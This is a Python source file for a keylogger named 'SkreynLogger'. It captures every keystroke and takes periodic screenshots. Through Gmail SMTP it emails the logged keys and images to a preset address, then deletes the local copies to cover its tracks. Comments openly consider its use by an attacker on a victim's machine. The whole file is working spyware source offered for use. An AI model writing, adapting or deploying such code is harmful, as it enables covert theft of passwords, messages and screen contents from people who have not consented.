import pynput, time, pyautogui, email, smtplib, ssl, os
from pynput.keyboard import Key, Listener
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pathlib import *

timeStart = time.time()
keys = []

def on_press(key):
	global keys, timeStart
	interval = 3					# change the interval duration ex.: each 10 seconds a screenshot will be taken and keypreses saved inside a file
	keys.append(key)

	print("{0} pressed".format(key))			#prints the recorded key presses in the terminal, helps debugging
	timeNow = time.time()

	if timeNow >= timeStart+interval:							# saves images and key presses periodically
		write_file(keys)
		timeStart = time.time()
		keys = []
		screenshot = pyautogui.screenshot()
		screenshot.save(r"image_" + str(time.time()).split('.')[0] + ".png")
		send_email()

def write_file(keys):
	filename = ("keys_" + str(time.time()).split('.')[0] + '.txt')				# filename is keys_*timestamp*

	with open(filename, "w") as file:						# beautify output of special keys
		for key in keys:							# i hate the amount of ifs but... no switch-case in python :x
			key = str(key).replace("'","")

			if key.find("backspace") >0:
                                file.write('_BACKSPACE_')

			elif key.find("space") > 0:
				file.write('\n')

			elif key.find("ctrl") > 0:
				file.write('_CTRL_')

			elif key.find("alt") > 0:
				file.write('_ALT_')

			elif key.find("tab") > 0:
				file.write('\t')

			elif key.find("esc") > 0:
				file.write('_ESC_')

			elif key.find("caps") > 0:
				file.write('_CAPS LOCK_')

			elif key.find("shift") > 0:
				file.write('_SHIFT_')

			elif key.find("enter") > 0:
				file.write('_ENTER_')

			elif key.find("key") == -1:
				file.write(key)

def send_email():
	subject = ("SkreynLogger - " + str(time.time()).split('.')[0])
	body = ""
	receiver_email = "REDACTED"
	sender_email = "REDACTED"			
	password = "PASSWORD_REDACTED"			#please please please please plEASE DO NOT UPLOAD YOUR CREDENTIALS TO A GITHUB REPO
							# honestly, even if this was used by an attacker... he'd probably have to use a dummy email account
							# would be stupid to leave your email credentials inside a victim's machine :D
							# if you're using gmail, you have to create a new 'App Password' in your account settings to send emails with this script
	message = MIMEMultipart()
	message["From"] = sender_email
	message["To"] = receiver_email
	message["Subject"] = subject
	message.attach(MIMEText(body, "plain"))


	dir_path = Path(os.getcwd())
	images = list(dir_path.glob('image*'))
	keystrokes = list(dir_path.glob('keys*'))


	for i in range(0,len(images)):
		images[i] = images[i].name

	for i in range(0, len(keystrokes)):
		keystrokes[i] = keystrokes[i].name


	files = images+keystrokes
	for filename in files:
		#print("ATTACHING FILE: " + filename)					# debug
		with open(filename, "rb") as attachment:
    			# Add file as application/octet-stream
    			# Email client can usually download this automatically as attachment
			part = MIMEBase("application", "octet-stream")
			part.set_payload(attachment.read())
			part.add_header('Content-Disposition','attachment; filename='+ filename)


		encoders.encode_base64(part)
		message.attach(part)
		text = message.as_string()

		# cleanup from filesystem files sent via email
		os.remove(filename)


	# Log in to server using secure context and send email
	context = ssl.create_default_context()
	with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:	#not sure about other servers, but don't change this to send FROM a gmail account
    		server.login(sender_email, password)
    		server.sendmail(sender_email, receiver_email, text)


	return


def on_release(key):
	pass

with Listener(on_press=on_press, on_release=on_release) as listener:
	listener.join()


